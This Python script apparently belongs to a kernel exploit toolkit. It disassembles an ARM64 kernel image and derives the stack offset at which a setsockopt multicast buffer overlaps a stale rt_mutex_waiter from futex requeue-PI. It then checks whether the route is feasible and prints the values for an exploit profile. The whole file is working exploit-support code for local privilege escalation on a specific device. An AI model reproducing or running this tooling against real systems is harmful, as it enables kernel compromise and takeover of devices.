#!/usr/bin/env python3
"""Port of ghostlock-app's tools/extract_rs derive::multicast_waiter_off().

The multicast_waiter route stamps a *user* buffer that the kernel copies onto
ip_setsockopt()'s stack (MCAST_BLOCK_SOURCE -> struct group_source_req greqs).
If that copy window lands on a stale rt_mutex_waiter, the stamp bytes become
waiter->task / waiter->lock.  The geometry is profile-supplied
(waiter_off / buffer_size / task_offset / lock_offset), so we can derive it for
this kernel and just write it into the GLK1 profile.

    setsockopt_depth = Σ setsockopt chain frames − greqs local offset
    waiter_depth     = Σ futex chain frames      − waiter local offset
    waiter_off       = setsockopt_depth − waiter_depth

waiter_off must be >= 0 (the stamp is indexed forward from greqs) and the last
stamped field (waiter_off + lock_offset + 8) must stay inside
sizeof(struct group_source_req) = 0x108, which is what the kernel actually
copies regardless of the optlen we pass.

Reference value: the upstream tool reproduces 0x60 on A301SO hardware.

Usage: derive_multicast.py [Image] [symbols.json]
"""
import json
import re
import sys

import capstone

IMAGE = sys.argv[1] if len(sys.argv) > 1 else "Image"
SYMS = sys.argv[2] if len(sys.argv) > 2 else "symbols.json"
BASE = 0xFFFFFFC008000000
CAP = 0x3000
GSR_SIZE = 0x108          # sizeof(struct group_source_req)
PI_TREE_ENTRY = 0x18      # rt_mutex_waiter.pi_tree_entry (BTF, compact 6.1)
WAITER_SIZE = 0x58

data = open(IMAGE, "rb").read()
syms = {k: int(v, 16) for k, v in json.load(open(SYMS, encoding="utf-8")).items()}
offs = {k: v - BASE for k, v in syms.items()}
so = sorted(offs.values())
addr2 = {v - BASE: k for k, v in syms.items()}
md = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_LITTLE_ENDIAN)
md.detail = True


def lines(name, cap=CAP):
    s = offs[name]
    h = next((o for o in so if o > s), s + cap)
    return [f"{x.mnemonic}\t{x.op_str}" for x in md.disasm(data[s:min(s + cap, h)], s)]


def frame(name):
    total, sub_done, ev = 0, False, []
    for l in lines(name):
        m = re.match(r"(?i)^stp\tx29, x30, \[sp, #-0x([0-9a-f]+)\]!", l)
        if m:
            total += int(m.group(1), 16)
            ev.append(int(m.group(1), 16))
        if not sub_done:
            m = re.match(r"(?i)^sub\tsp, sp, #0x([0-9a-f]+)", l)
            if m:
                total += int(m.group(1), 16)
                sub_done = True
                ev.append(int(m.group(1), 16))
    return total, ev


def link_targets(name):
    s = offs[name]
    h = next((o for o in so if o > s), s + CAP)
    out = []
    for x in md.disasm(data[s:min(s + CAP, h)], s):
        if x.mnemonic in ("bl", "b") and x.operands and \
                x.operands[0].type == capstone.arm64.ARM64_OP_IMM:
            out.append((x.mnemonic, addr2.get(x.operands[0].imm, "?")))
        elif x.mnemonic == "blr":
            out.append(("blr", "(indirect)"))
    return out


def greqs_offset(name, size):
    """The add xN, sp, #off feeding the mov w2, #<size> user-copy size."""
    L = lines(name)
    mov = re.compile(r"(?i)^mov\tw\d+, #0x%x$" % size)
    add = re.compile(r"(?i)^add\t(x\d+), sp, #0x([0-9a-f]+)$")
    for i, l in enumerate(L):
        if not mov.match(l):
            continue
        for j in range(i - 1, max(-1, i - 10), -1):
            m = add.match(L[j])
            if m:
                return int(m.group(2), 16), i
    return None, None


def waiter_local():
    for i, l in enumerate(lines("futex_wait_requeue_pi")):
        if not re.match(r"(?i)^mov\tw2, #0x%x$" % WAITER_SIZE, l):
            continue
        F = lines("futex_wait_requeue_pi")
        for j in range(i - 1, max(-1, i - 4), -1):
            m = re.match(r"(?i)^add\t(x\d+), sp, #0x([0-9a-f]+)$", F[j])
            if m:
                return int(m.group(2), 16)
    return None


CHAIN = ["__arm64_sys_setsockopt", "__sys_setsockopt", "sock_common_setsockopt",
         "udp_setsockopt", "ip_setsockopt", "do_ip_setsockopt"]

print("=== frames ===")
sums = 0
for n in CHAIN:
    if n not in offs:
        sys.exit(f"FATAL: {n} missing from symbols")
    f, ev = frame(n)
    sums += f
    print(f"  {n:28s} 0x{f:x}  {[hex(v) for v in ev]}")
print(f"  setsockopt chain sum = 0x{sums:x}")

print("\n=== link check (is the chain real?) ===")
for a, b in zip(CHAIN, CHAIN[1:]):
    t = link_targets(a)
    direct = [n for m, n in t if n == b]
    indirect = any(m == "blr" for m, n in t)
    print(f"  {a:28s} -> {b:26s} direct={bool(direct)} indirect={indirect}")

w_local = waiter_local()
fsum = 0
for n in ["__arm64_sys_futex", "futex_wait_requeue_pi"]:
    fsum += frame(n)[0]
print(f"\n=== futex side ===\n  futex frame sum = 0x{fsum:x}  waiter_local = "
      f"{hex(w_local) if w_local is not None else 'N/A'}")

gre, line_no = greqs_offset("do_ip_setsockopt", GSR_SIZE)
print(f"\n=== do_ip_setsockopt greqs copy window (size 0x{GSR_SIZE:x}) ===\n"
      f"  greqs local = sp+{hex(gre) if gre is not None else 'N/A'}")

if gre is None or w_local is None:
    sys.exit("FATAL: geometry inputs not found")

ss_depth = sums - gre
waiter_depth = fsum - w_local
waiter_off = ss_depth - waiter_depth
print(f"\n  setsockopt_depth = 0x{ss_depth:x}")
print(f"  waiter_depth     = 0x{waiter_depth:x}")
print(f"  ==> waiter_off   = {waiter_off} (0x{waiter_off:x})")
print(f"      upstream reference (A301SO) = 0x60")
print(f"      constraint: 0 <= waiter_off and waiter_off + 0x38 + 8 <= 0x{GSR_SIZE:x}")
if waiter_off < 0:
    print("  !! NEGATIVE: the waiter sits below the stamp buffer -> route infeasible")
elif waiter_off + 0x40 > GSR_SIZE:
    print(f"  !! waiter_off + 0x40 = 0x{waiter_off+0x40:x} exceeds the 0x{GSR_SIZE:x} copy -> infeasible")
else:
    print("  ==> FEASIBLE")
    print(f"      profile: waiter_off={waiter_off} buffer_size={max(GSR_SIZE, waiter_off + 0x40)} "
          f"task_offset=48 lock_offset=56")
